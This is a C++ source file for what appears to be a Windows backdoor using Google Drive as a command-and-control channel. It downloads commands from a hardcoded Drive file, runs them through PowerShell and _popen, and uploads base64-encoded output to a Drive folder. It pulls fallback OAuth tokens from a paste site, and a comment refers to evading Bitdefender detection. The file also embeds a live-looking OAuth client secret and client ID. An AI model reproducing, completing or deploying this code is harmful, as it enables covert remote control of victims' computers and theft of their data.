#include <windows.h>
#include <string>
#include <stdio.h>
#include <cmath>
#include <algorithm>




//"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --dump-dom "https://drive.google.com/file/d/1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1/view" > a.txt


#define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
#define FAILSAFE_THRESHOLD 2402 * 1000
#define EXPONENTIAL_POWER 4
#define RESULTS_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
#define SOURCE_ID "1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
//#define MAX_UPLOAD_SIZE 6656 // 6.5 * 1024
#define MAX_UPLOAD_SIZE 4608 // 4.5 * 1024


#define BDRIVE_OK 200
#define BDRIVE_NO_CONTENT 204
#define BDRIVE_REFRESH_NOT_ACCEPTABLE 406
#define BDRIVE_TIMED_OUT 600
#define BDRIVE_NO_INTERNET 601
#define BDRIVE_INVALID_ACCESS_TOKEN 401
#define BDRIVE_INVALID_REFRESH_TOKEN 699

#define STATE_INIT 0b11111111
#define STATE_DOWNLOADING 0b00
#define STATE_EXECUTING 0b01
#define STATE_UPLOADING 0b10
#define STATE_DELETING 0b11
#define STATE_ACCESS_TOKEN_LOST 0b100
#define STATE_REFRESH_TOKEN_LOST 0b101
#define STATE_CONNECTION_LOST 0b1000


#define CLIPBOARD "41594159"
#define CLIENT_SECRET "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"
#define CLIENT_ID "1013834111625-kc1mpb1btv5e7nci2lak6f4v8nklon3p.apps.googleusercontent.com"
#define RESULT_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
#define BACKUP_FILE_ID "1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1"

static const char bs64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static bool PathExists(std::string path) {
	DWORD attributes = GetFileAttributesA(path.c_str());
	return attributes != INVALID_FILE_ATTRIBUTES;
}

static DWORD expo(DWORD base, DWORD exponent) {
	if (exponent == 0) {
		return 1;
	}
	else if (exponent == 1) {
		return base;
	}
	DWORD half = expo(base, exponent / 2);
	return half * half * expo(base, exponent % 2);
}

static std::string base64_encode(const std::string& input) {
	std::string encoded;
	int val = 0, valb = -6;
	for (unsigned char c : input) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			encoded.push_back(bs64[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) {
		encoded.push_back(bs64[((val << 8) >> (valb + 8)) & 0x3F]);
	}
	while (encoded.size() % 4) {
		encoded.push_back('='); // Add padding if necessary
	}
	return encoded;
}

inline WORD getErrorCode(std::string input) {
	return (input[0] - '0') * 100 + (input[1] - '0') * 10 + (input[2] - '0');
}

inline WORD getErrorCode(char* input) {
	return (input[0] - '0') * 100 + (input[1] - '0') * 10 + (input[2] - '0');
}

inline void decoder(char str[]) {
	str[0] += 7;
	str[1] += 7;
	int mode = (str[0] + str[1]) % 10;
	for (size_t i = 2; i < strlen(str); i++)
	{
		str[i] += mode;
	}

}
//decoder

/// <summary>
/// This function is used to request and set a new accessToken.
/// </summary>
/// <param name="accessToken">A string to output new Access Token</param>
/// <param name="refreshToken">A string to just input Refresh Token</param>
/// <returns>
/// 200 OK!
/// BDRIVE_INVALID_REFRESH_TOKEN
/// BDRIVE_TIMED_OUT
/// BDRIVE_NO_INTERNET
/// </returns>
static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {
#define BUFFER_SIZE 1024

	WORD errorCode = BDRIVE_OK;
	char* buffer = new char[BUFFER_SIZE];
	sprintf_s(buffer, BUFFER_SIZE - 1, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30;Write-Host -NoNewline $response.access_token | ConvertTo-Json}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", CLIENT_ID, CLIENT_SECRET, refreshToken.c_str());

	FILE* file = _popen(buffer, "r");
	fgets(buffer, BUFFER_SIZE - 1, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		errorCode = getErrorCode(buffer);
		if (errorCode == 400)
		{
			errorCode = BDRIVE_INVALID_REFRESH_TOKEN;
		}
	}
	else { accessToken = buffer; }

	delete[] buffer;
	return errorCode;
#undef BUFFER_SIZE
}

/// <summary>
/// This method is going to get used in handling failsafe situation.
/// ***In the Bitdefender AV test this method isn't FUD.***
/// </summary>
/// <param name="refreshToken">A string to output new Refresh Token</param>
/// <param name="accessToken">A string to output new Access Token</param>
/// <returns>
/// setNewAccessToken ErrorCodes!
/// BDRIVE_NO_REFRESH
/// BDRIVE_INVALID_REFRESH_TOKEN
/// 600 Invoke-Restmethod Timedout!
/// </returns>
static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken, int n) {
#define BUFFER_SIZE 1024
	char* buffer = new char[BUFFER_SIZE];

	sprintf_s(buffer, BUFFER_SIZE - 1, "powershell -c \"try{Write-Host -NoNewline (Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=%s' -TimeoutSec 30).RefreshToken} catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", BACKUP_FILE_ID);
	FILE* file = _popen(buffer, "r");
	////// you should edit this
	fgets(buffer, BUFFER_SIZE - 1, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		int errorCode = getErrorCode(buffer);
		delete[] buffer;
		return errorCode;
	}
	else if (buffer[0] == 'p' && buffer[1] == 'o') {

		delete[] buffer;
		return BDRIVE_NO_CONTENT;
	}
	else {
		if (buffer[0] == '1' && buffer[1] == '/' && buffer[2] == '/')
		{
			refreshToken = buffer;
			delete[] buffer;
			return setNewAccessToken(accessToken, refreshToken);
		}
		else {

			delete[] buffer;
			return BDRIVE_INVALID_REFRESH_TOKEN;
		}
	}
#undef BUFFER_SIZE
}

/// <summary>
/// This method is going to get used in handling failsafe situation.
/// ***This method doesn't act deterministic***
/// </summary>
/// <param name="refreshToken"></param>
/// <param name="accessToken"></param>
/// <returns></returns>
static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken, char n) {
#define BUFFER_SIZE 1024

	std::string output;
	std::string edgePath64 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
	std::string edgePath32 = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
	std::string edgePath = PathExists(edgePath64) ? edgePath64 : edgePath32;

	char* buffer = new char[BUFFER_SIZE];

	sprintf_s(buffer, BUFFER_SIZE - 1, "\"\"%s\" --headless --dump-dom \"https://drive.google.com/file/d/%s/view\" --user-data-dir=\"C:\\Users\\Public\\temp\" \"", edgePath.c_str(), BACKUP_FILE_ID);

	FILE* file = _popen(buffer, "r");
	////// you should edit this
	while (fgets(buffer, sizeof(buffer), file) != nullptr) {
		output += buffer;
	}
	_pclose(file);
	delete[] buffer;
	size_t pos = output.find("\"1//");
	pos != std::string::npos ? static_cast<int>(pos) : -1;
	if (pos != -1)
	{
		pos++; //increment the pos to skip the first quote
		int count = 1;
		while (output[pos + count] != '\"') {
			count++;
			if (pos + count > output.length()) {
				return BDRIVE_NO_INTERNET;
			}
		}
		output = output.substr(pos, count);
		refreshToken = output;
		return setNewAccessToken(accessToken, refreshToken);
	}
	else {
		return BDRIVE_NO_INTERNET;
	}

#undef BUFFER_SIZE
}

/// <summary>
/// This method is going to get used in handling failsafe situation.
/// </summary>
/// <param name="refreshToken">A string to output new Refresh Token</param>
/// <param name="accessToken">A string to output new Access Token</param>
/// <returns>
/// setNewAccessToken ErrorCodes!
/// BDRIVE_NO_REFRESH
/// BDRIVE_INVALID_REFRESH_TOKEN
/// BDRIVE_TIMED_OUT Invoke-Restmethod Timedout!
/// </returns>
static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken) {
#define BUFFER_SIZE 1024
	char* buffer = new char[BUFFER_SIZE];
	std::string output;

	sprintf_s(buffer, BUFFER_SIZE - 1, "powershell -c \"try{(Invoke-WebRequest https://cl1p.net/%s).Content} catch{Write-Host -NoNewline 600}\"", CLIPBOARD);

	FILE* file = _popen(buffer, "r");
	////// you should edit this
	while (fgets(buffer, sizeof(buffer), file) != nullptr) {
		output += buffer;
	}
	_pclose(file);
	delete[] buffer;

	if (output.substr(0, 3) == "600")
	{
		return BDRIVE_TIMED_OUT;
	}

	size_t pos = output.find("\"1//");
	pos != std::string::npos ? static_cast<int>(pos) : -1;
	if (pos != -1)
	{
		pos++; //increment the pos to skip the first quote
		int count = 1;
		while (output[pos + count] != '\"') {
			count++;
			if (pos + count > output.length()) {
				return BDRIVE_NO_CONTENT;
			}
		}
		output = output.substr(pos, count);
		refreshToken = output;
		return setNewAccessToken(accessToken, refreshToken);
	}
	else {
		return BDRIVE_NO_CONTENT;
	}

#undef BUFFER_SIZE
}

static WORD checkConnection()
{
#define BUFFER_SIZE 512

	WORD errorCode = BDRIVE_NO_INTERNET;
	char* buffer = new char[BUFFER_SIZE];

	snprintf(buffer, BUFFER_SIZE - 1, "powershell.exe -c \"try { $response = Invoke-WebRequest 'http://www.google.com' -TimeoutSec 30 -Method 'HEAD'; Write-Host -NoNewline $response.StatusCode } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"");

	FILE* file = _popen(buffer, "r");

	fgets(buffer, 4, file);

	if (buffer[0] == '2' || buffer[0] == '4' || buffer[0] == '6')
	{
		errorCode = getErrorCode(buffer);
	}
	delete[] buffer;

	return errorCode;
#undef BUFFER_SIZE
}
//review this two function

/// <summary>
/// A procedure to handle the failsafe.
/// </summary>
/// <param name="refreshToken">A string to output Refresh Token</param>
/// <param name="accessToken">A string to output Access Token</param>
static void handleFailsafe(std::string& refreshToken, std::string& accessToken) {
	BYTE flag = true;
	BYTE i = 0;
	DWORD delay = 0;

	while (true)
	{
		//these two nested branches are to prevent of extra calculations and the other is to not exceeds the threshold
		if (flag)
		{
			delay = expo(i++, EXPONENTIAL_POWER) * 1000;
			if (delay > FAILSAFE_THRESHOLD)
			{
				flag = false;
				delay = FAILSAFE_THRESHOLD;
			}
		}
		Sleep(delay);

		if (setNewRefreshAndAccessToken(refreshToken, accessToken) == BDRIVE_OK)
		{
			return;
		}
	}
}

/// <summary>
/// This function downloads the Source.txt file in the Drive
/// </summary>
/// <param name="accessToken">The access token as string</param>
/// <param name="output">An output string that has the downloaded content</param>
/// <returns>
/// 200 OK!
/// 204 No Content!
/// 600 Timeout!
/// 601 Unhandled Exception!
/// </returns>
static WORD downloadSourceContext(std::string accessToken, std::string& output) {
#define BUFFER_SIZE 1024

	if (accessToken.empty())
	{
		return BDRIVE_INVALID_ACCESS_TOKEN;
	}
	output = "";
	char* buffer = new char[BUFFER_SIZE];

	snprintf(buffer, BUFFER_SIZE - 1, "powershell.exe -c \"try { $response = Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/%s?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}; Write-Host -NoNewline $response } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_ID,
		accessToken.c_str()
	);


	FILE* file = _popen(buffer, "r");
	while (fgets(buffer, BUFFER_SIZE - 1, file) != NULL) {
		output = output + buffer;
	}

	_pclose(file);
	delete[] buffer;

	if (output.empty())
	{
		return BDRIVE_NO_CONTENT;
	}
	else if (output.length() == 3 && output[0] <= '9' && output[0] >= '0')
	{
		return getErrorCode(output);
	}
	return BDRIVE_OK;
#undef BUFFER_SIZE
}

/// <summary>
/// Execute a command in a manner suitable for _popen() function and put the result in output string.
/// </summary>
/// <param name="input">The command downloaded from source</param>
/// <param name="output">Output of the pipe that got opened by _popen()</param>
/// <returns>returns 0 :|</returns>
static WORD commandExecuter(std::string input, std::string& output) {
#define BUFFER_SIZE 1024

	std::replace(input.begin(), input.end(), '\n', '&');
	FILE* file = _popen(input.c_str(), "r");
	output = "";
	char* buffer = new char[BUFFER_SIZE];

	while (fgets(buffer, BUFFER_SIZE - 1, file) != NULL) {
		output = output + buffer;
	}
	_pclose(file);
	delete[] buffer;

	return 0;
#undef BUFFER_SIZE
}

/// <summary>
/// This function upload a single file up to 6656 characters (Around 6.5 KB).
/// </summary>
/// <param name="uploadpart"></param>
/// <param name="accessToken"></param>
/// <param name="index"></param>
/// <param name="subIndex"></param>
/// <returns>
/// 200 OK!
/// 401 Unauthorized!
/// 600 Timeout!
/// 601 Unhandled Exception!
/// </returns>
static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DWORD index, DWORD& subIndex) {
#define BUFFER_SIZE 7168 

	char* buffer = new char[BUFFER_SIZE];
	WORD errorCode = BDRIVE_OK;
	snprintf(buffer, BUFFER_SIZE - 1, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", accessToken.c_str(), index, subIndex, RESULTS_FOLDER_ID, base64_encode(uploadpart).c_str());
	FILE* file = _popen(buffer, "r");
	delete[] buffer;
	buffer = new char[4];
	fgets(buffer, 4, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		errorCode = getErrorCode(buffer);
	}
	delete[] buffer;
	return errorCode;
#undef BUFFER_SIZE
}

/// <summary>
/// This function tries to upload the whole input to The drive
/// need to error handle!!!!!
/// </summary>
/// <param name="input"></param>
/// <param name="accessToken"></param>
/// <param name="index">The index of whole files that you want to upload</param>
/// <returns>Same as singlePartUpload function</returns>
static WORD uploadResult(std::string input, std::string accessToken, DWORD index, DWORD& subIndex) {
	//input = base64_encode(input);

	WORD errorCode = BDRIVE_OK;

	for (size_t i = subIndex * MAX_UPLOAD_SIZE; i < input.length(); subIndex++, i = subIndex * MAX_UPLOAD_SIZE)
	{
		errorCode = singlePartUpload(input.substr(i, MAX_UPLOAD_SIZE), accessToken, index, subIndex);

		if (errorCode != BDRIVE_OK)
		{
			subIndex--;
			return errorCode;
		}
	}

	return errorCode;
}

/// <summary>
/// This function delete the resource file that is on the Google drive.
/// </summary>
/// <param name="accessToken"></param>
/// <returns>
/// 200 OK!
/// 401 Unauthorized!
/// 600 Timeout!
/// 601 Unhandled Exception!
/// </returns>
static WORD deleteSource(std::string accessToken) {
#define BUFFER_SIZE 1024

	char* buffer = new char[BUFFER_SIZE];
	WORD errorCode = BDRIVE_OK;
	snprintf(buffer, BUFFER_SIZE - 1, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/%s?access_token=%s' -Method 'PATCH' -TimeoutSec 30}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_ID, accessToken.c_str());
	FILE* file = _popen(buffer, "r");
	delete[] buffer;
	buffer = new char[4];
	fgets(buffer, 4, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		errorCode = getErrorCode(buffer);
	}
	delete[] buffer;
	return errorCode;

#undef BUFFER_SIZE
}

static void setNextState(BYTE& curState, WORD resCode) {
	if (curState == STATE_DOWNLOADING)
	{
		switch (resCode)
		{
		case BDRIVE_OK:
			curState = STATE_EXECUTING;
			break;
		case BDRIVE_NO_CONTENT:
			curState = STATE_DOWNLOADING;
			break;
		case BDRIVE_INVALID_ACCESS_TOKEN:
			curState = STATE_ACCESS_TOKEN_LOST;
			break;
		case BDRIVE_TIMED_OUT: //TODO
		case BDRIVE_NO_INTERNET:
		default:
			curState = STATE_CONNECTION_LOST;
			break;
		}
	}
	else if (curState == STATE_EXECUTING)
	{
		if (resCode == 0)
		{
			curState = STATE_UPLOADING;
		}
	}
	else if (curState == STATE_UPLOADING) {
		switch (resCode)
		{
		case BDRIVE_OK:
			curState = STATE_DELETING;
			break;
		case BDRIVE_INVALID_ACCESS_TOKEN:
			curState = STATE_ACCESS_TOKEN_LOST;
			break;
		case BDRIVE_NO_INTERNET:
		case BDRIVE_TIMED_OUT:
		default:
			break;
		}
	}
	else if (curState == STATE_DELETING) {
		//This is the case for loosing access token
	}
	else if (curState == STATE_REFRESH_TOKEN_LOST) {

	}
	else {

	}

}